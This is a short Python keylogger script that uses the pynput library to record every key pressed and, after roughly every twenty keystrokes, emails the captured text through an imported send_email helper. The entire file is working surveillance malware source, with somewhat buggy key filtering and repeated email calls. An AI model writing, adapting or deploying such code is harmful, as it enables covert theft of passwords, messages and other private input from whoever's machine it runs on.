import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def on_press(key):
    print(key, end="")
    print("pressed" )
    
    global keys, count
    keys.append(str(key)+"\n")
    count+=1
    if count>20:
        count=0
        email(keys)
def email(keys):
    message=""
    for key in keys:
        k=key.replace("'","")
        if key=="Key.space":
            key=" "
        elif key.find("Key")>0:
            k=""
        message+=k
        print(message)
        send_email.sendEmail(message)
def on_Release(key):
    if key==Key.esc:
        return False
with Listener(on_press=on_press,on_release=on_Release)as listener:
    listener.join()